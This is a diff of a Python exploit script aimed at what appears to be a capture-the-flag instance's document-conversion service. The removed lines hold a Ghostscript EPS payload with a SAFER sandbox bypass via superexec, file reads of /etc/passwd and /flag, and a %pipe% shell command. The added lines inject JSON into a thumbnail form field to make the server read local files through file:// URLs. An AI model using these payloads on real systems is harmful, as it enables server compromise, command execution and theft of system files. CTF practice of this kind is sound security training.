@@ -1,71 +1,32 @@
 #!/usr/bin/env python3
-"""Temporary CTF EPS/Ghostscript probe with rendering control."""
-import io
+"""Temporary CTF get-thumbnail target JSON-injection probe."""
+import pathlib
 import urllib.error
 import urllib.request
 import uuid
-from pypdf import PdfReader
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
-
-STATIC = r'''%!PS-Adobe-3.0 EPSF-3.0
-%%BoundingBox: 36 36 576 756
-%%Pages: 1
-%%EndComments
-/Courier 20 selectfont
-72 500 moveto
-(ARENA_STATIC_MARKER) show
-showpage
-%%EOF
-'''
-
-READER = r'''%!PS-Adobe-3.0 EPSF-3.0
-%%Document-Fonts: Times-Roman
-%%Title: circle.eps
-%%Pages: 1
-%%BoundingBox: 36 36 576 756
-%%LanguageLevel: 1
-%%EndComments
-/Courier 20 selectfont
-72 500 moveto
-BYPASS
-/infile (TARGET) (r) file def
-/buff 1024 string def
-/Courier 8 selectfont
-/LM 40 def
-/ypos 400 def
-/lineheight 10 def
-/newline { ypos lineheight sub /ypos exch def LM ypos moveto } def
-LM ypos moveto
-{
-  infile buff readline
-  { buff cvs show newline }
-  { buff cvs show infile closefile exit }
-  ifelse
-} bind loop
-showpage
-%%Trailer
-'''
-
-BYPASS = "{ systemdict /SAFER false put systemdict /userparams get /PermitFileControl [(*)] put systemdict /userparams get /PermitFileWriting [(*)] put systemdict /userparams get /PermitFileReading [(*)] put } 1183615869 internaldict /superexec get exec"
+OUT = pathlib.Path(__file__).parent
 
 
-def convert(data, label):
+def thumbnail(target, label):
+    data = b"ARENA_ORIGINAL_DOCUMENT\nsecond line\n"
     boundary = "----Arena" + uuid.uuid4().hex
-    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"probe.eps\"\r\nContent-Type: application/postscript\r\n\r\n".encode() + data.encode() + f"\r\n--{boundary}--\r\n".encode())
-    req = urllib.request.Request(BASE + "/cool/convert-to/pdf", data=body, method="POST")
+    parts = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n{target}\r\n".encode()]
+    parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"document.txt\"\r\nContent-Type: text/plain\r\n\r\n".encode())
+    parts.append(data)
+    parts.append(f"\r\n--{boundary}--\r\n".encode())
+    req = urllib.request.Request(BASE + "/cool/get-thumbnail", data=b"".join(parts), method="POST")
     req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
-    print("\n===", label, flush=True)
+    print("\n===", label, "TARGET", repr(target), flush=True)
     try:
         with urllib.request.urlopen(req, timeout=90) as r:
-            raw = r.read(3000000)
-            print("STATUS", r.status, "BYTES", len(raw), flush=True)
-            if raw.startswith(b"%PDF"):
-                try:
-                    reader = PdfReader(io.BytesIO(raw))
-                    print("PDF_TEXT", "\n".join((p.extract_text() or "") for p in reader.pages), flush=True)
-                except Exception as e:
-                    print("PDF_PARSE_ERROR", repr(e), flush=True)
+            raw = r.read(5000000)
+            print("STATUS", r.status, "TYPE", r.headers.get("Content-Type"), "BYTES", len(raw), "PNG", raw.startswith(b"\x89PNG"), flush=True)
+            if raw.startswith(b"\x89PNG"):
+                path = OUT / ("thumb_" + label + ".png")
+                path.write_bytes(raw)
+                print("SAVED", path.name, flush=True)
             else:
                 print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
     except urllib.error.HTTPError as e:
@@ -74,12 +35,10 @@ def convert(data, label):
         print("ERROR", repr(e), flush=True)
 
 
-convert(STATIC, "STATIC_CONTROL")
-for target, bypass, label in (
-    ("/etc/passwd", "", "DIRECT_PASSWD"),
-    ("/etc/passwd", BYPASS, "SUPEREXEC_PASSWD"),
-    ("/flag", BYPASS, "SUPEREXEC_FLAG"),
-    ("%pipe%cat /flag", "", "PIPE_FLAG"),
-    ("%pipe%cat /flag", BYPASS, "SUPEREXEC_PIPE_FLAG"),
-):
-    convert(READER.replace("TARGET", target).replace("BYPASS", bypass), label)
+def inject(url):
+    return '"},"URL":{"type":"string","value":"' + url
+
+
+thumbnail("", "control")
+thumbnail(inject("file:///etc/passwd"), "passwd")
+thumbnail(inject("file:///flag"), "flag")
